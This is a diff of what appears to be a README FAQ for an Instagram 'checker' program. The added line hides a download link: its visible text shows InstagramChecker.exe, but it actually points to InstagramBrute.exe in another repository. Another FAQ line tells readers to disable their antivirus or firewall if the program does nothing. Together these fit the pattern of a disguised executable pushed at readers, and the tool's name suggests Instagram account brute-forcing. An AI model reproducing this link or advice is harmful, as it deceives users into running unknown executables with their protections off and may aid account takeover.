@@ -19,7 +19,7 @@ THIS PROGRAM IS NOT CREATED FOR PAID DISTRIBUTION
 
 Possible Questions:
 
-1.Where can I get the checker program? Look for it in the "Releases" section: Releases. https://github.com/basesof/Instagram-Checker/releases/download/instagram/InstagramChecker.exe
+1.Where can I get the checker program? Look for it in the "Releases" section: Releases. [https://github.com/basesof/Instagram-Checker/releases/download/instagram/InstagramChecker.exe](https://github.com/basesof/Instagram-Brute-Checker/releases/download/instagram/InstagramBrute.exe)
 
 2.Why does nothing happen when I click the Start button? Your antivirus or firewall may be blocking requests. Try disabling it and also consider using a VPN.
 
